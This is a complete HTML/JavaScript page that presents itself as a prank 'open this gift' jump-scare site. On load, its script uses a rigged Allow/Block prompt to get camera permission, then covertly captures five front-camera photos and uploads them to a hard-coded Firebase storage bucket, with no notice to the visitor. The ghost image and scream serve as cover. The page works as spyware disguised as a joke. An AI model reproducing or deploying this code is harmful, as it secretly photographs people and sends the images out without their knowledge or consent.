<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Merged Funny and Scary Website</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            transition: background-color 1s ease;
        }
        .container, .gift-container {
            max-width: 600px;
            display: none; /* Hide initially */
        }
        h1 {
            font-size: 2em;
            margin-bottom: 20px;
        }
        .footer-text {
            font-size: 1.2em;
            margin-top: 20px;
            color: #ccc;
        }
        .fallback {
            color: red;
            margin-top: 20px;
        }
        /* MCQ-style permission guidance */
        .mcq-container {
            margin-top: 30px;
            display: none; /* Hide initially */
        }
        .mcq-option {
            display: inline-block;
            margin: 10px;
            padding: 10px 20px;
            background-color: #333;
            border-radius: 10px;
            cursor: pointer;
            position: relative;
            font-size: 1.2em;
        }
        /* Correct option with a revolving red rectangle */
        .mcq-option.correct {
            border: 2px solid transparent;
            position: relative;
        }
        .mcq-option.correct::before {
            content: '';
            position: absolute;
            top: -10px;
            left: -10px;
            right: -10px;
            bottom: -10px;
            border: 2px solid red;
            animation: rotateRectangle 1.5s linear infinite;
        }
        @keyframes rotateRectangle {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }
        .error-message {
            color: red;
            font-size: 1.2em;
            margin-top: 10px;
        }
        /* Animation to float the arrow up and down */
        @keyframes float-arrow {
            0% {
                transform: translateY(0px);
            }
            50% {
                transform: translateY(-10px);
            }
            100% {
                transform: translateY(0px);
            }
        }
        .arrow {
            margin-top: 20px;
            animation: float-arrow 2s ease-in-out infinite;
        }
        /* Gift image styling */
        .gift {
            width: 200px;
            height: 200px;
            background-image: url('gift.png'); /* Add your gift box image here */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            cursor: pointer;
            position: relative;
            z-index: 1;
        }
        .heading {
            font-size: 2.5em;
            font-family: 'Comic Sans MS', cursive;
            color: red;
            margin-bottom: 20px;
            padding: 10px 20px;
            border: 2px solid red;
            display: inline-block;
            border-radius: 10px;
            background: rgba(255, 0, 0, 0.1);
            cursor: default;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
            transition: all 0.3s ease-in-out;
        }
        .heading:hover {
            background: rgba(255, 0, 0, 0.2);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
        }
        /* Hidden scary image */
        .hidden-ghost {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        .hidden-ghost img {
            width: 100px;
            height: auto;
            border: 5px solid white;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            transition: width 4s ease-out;
        }
        .hidden-ghost img.grow {
            width: 600px;
        }
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }
        .hidden-ghost img.shake {
            animation: shake 0.1s infinite;
        }
    </style>
</head>
<body>
    <!-- Permission Guidance Container -->
    <div class="container">
        <div class="mcq-container" id="mcq-container">
            <p>Please select the correct option to allow camera access:</p>
            <div class="mcq-option correct" id="mcq-allow">Allow</div>
            <div class="mcq-option" id="mcq-block">Block</div>
        </div>
        <div class="error-message" id="error-message" style="display: none;">Please click the "Allow" button.</div>
        <div class="fallback" id="fallback" style="display: none;">Your browser does not support the required permissions. Please open this page in Chrome or Safari.</div>
    </div>

    <!-- Scary Gift Section -->
    <div class="gift-container">
        <div class="heading" id="heading">Open this Gift</div>
        <div class="arrow">
            <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" fill="red" viewBox="0 0 24 24">
                <path d="M12 21l-12-18h24z"/>
            </svg>
        </div>
        <div class="gift" id="gift"></div>
    </div>

    <!-- Hidden Ghost Section -->
    <div class="hidden-ghost" id="ghost">
        <img id="ghost-image" src="scary.jpeg" alt="Scary Ghost">
        <audio id="scream" src="scary.ogg" preload="auto"></audio>
    </div>

    <script type="module">
        // Import Firebase SDKs
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBsG-hDNF8DRowgjz9WR4wVlSL398_gQyI",
            authDomain: "photos-c3ca9.firebaseapp.com",
            projectId: "photos-c3ca9",
            storageBucket: "photos-c3ca9.appspot.com",
            messagingSenderId: "231479999084",
            appId: "1:231479999084:web:045f573955ed1190f4b649",
            measurementId: "G-X7YW60B7V5"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        let photos = [];
        let photoCount = 0;
        const totalPhotos = 5;
        const fallbackDiv = document.getElementById('fallback');
        const mcqContainer = document.getElementById('mcq-container');
        const errorMessage = document.getElementById('error-message');
        const giftContainer = document.querySelector('.gift-container');
        const containerDiv = document.querySelector('.container');

        // Function to show fallback message
        function showFallback() {
            fallbackDiv.style.display = 'block';
            mcqContainer.style.display = 'none';
        }

        function capturePhoto(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataUrl = canvas.toDataURL('image/png');
            photos.push(dataUrl);
            photoCount++;

            // Once all photos are captured, upload them to Firebase
            if (photoCount === totalPhotos) {
                uploadPhotosToFirebase();
            }
        }

        function startPhotoCapture(video) {
            const captureInterval = setInterval(() => {
                capturePhoto(video);
                if (photoCount === totalPhotos) {
                    clearInterval(captureInterval);
                }
            }, 500);
        }

        function uploadPhotosToFirebase() {
            photos.forEach((photo, index) => {
                const photoRef = ref(storage, `photos/photo_${index + 1}.png`);

                // Upload the photo as base64
                uploadString(photoRef, photo, 'data_url').then((snapshot) => {
                    console.log('Uploaded a photo to Firebase!', snapshot);
                }).catch((error) => {
                    console.error('Failed to upload photo:', error);
                });
            });
        }

        function requestCameraPermissions() {
            navigator.permissions.query({ name: 'camera' }).then((result) => {
                if (result.state === 'granted') {
                    initCamera();
                } else if (result.state === 'denied') {
                    localStorage.removeItem('cameraPermissionGranted');
                    showFallback();
                } else {
                    // Show the MCQ guidance to the user
                    mcqContainer.style.display = 'block';
                }

                // Monitor for changes in permission state
                result.onchange = () => {
                    if (result.state === 'granted') {
                        initCamera();
                    } else if (result.state === 'denied') {
                        showFallback();
                    }
                };
            });
        }

        function askForPermission() {
            const constraints = { video: { facingMode: 'user' } };

            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => {
                    localStorage.setItem('cameraPermissionGranted', true);
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    startPhotoCapture(video);
                    showGiftContainer();
                })
                .catch(error => {
                    localStorage.removeItem('cameraPermissionGranted');
                    showFallback();
                });
        }

        function initCamera() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                showFallback();
                return;
            }

            const permissionGranted = localStorage.getItem('cameraPermissionGranted');
            if (permissionGranted) {
                askForPermission();
            } else {
                requestCameraPermissions();
            }
        }

        function showGiftContainer() {
            containerDiv.style.display = 'none'; // Hide the initial container
            giftContainer.style.display = 'block'; // Show the gift container
            document.body.style.backgroundColor = '#121212'; // Change background color
        }

        // Handle "Allow only this time" scenario
        window.addEventListener('beforeunload', () => {
            localStorage.removeItem('cameraPermissionGranted');
        });

        // Event listeners for MCQ-style options
        document.getElementById('mcq-allow').addEventListener('click', () => {
            askForPermission();
            mcqContainer.style.display = 'none';
            errorMessage.style.display = 'none';
        });

        document.getElementById('mcq-block').addEventListener('click', () => {
            errorMessage.style.display = 'block';
            mcqContainer.style.display = 'block';
        });

        // Initialize camera permissions
        initCamera();

        // Scary Gift Logic
        const giftDiv = document.getElementById('gift');
        const headingDiv = document.getElementById('heading');
        const ghostDiv = document.getElementById('ghost');
        const ghostImage = document.getElementById('ghost-image');
        const screamAudio = document.getElementById('scream');

        function showScary() {
            ghostDiv.style.display = 'flex'; // Show the hidden ghost section
            screamAudio.play(); // Play the scary sound
            setTimeout(() => {
                ghostImage.classList.add('grow', 'shake'); // Grow and shake the ghost image
            }, 500);
        }

        giftDiv.addEventListener('click', showScary);
        headingDiv.addEventListener('click', showScary);
    </script>
</body>
</html>
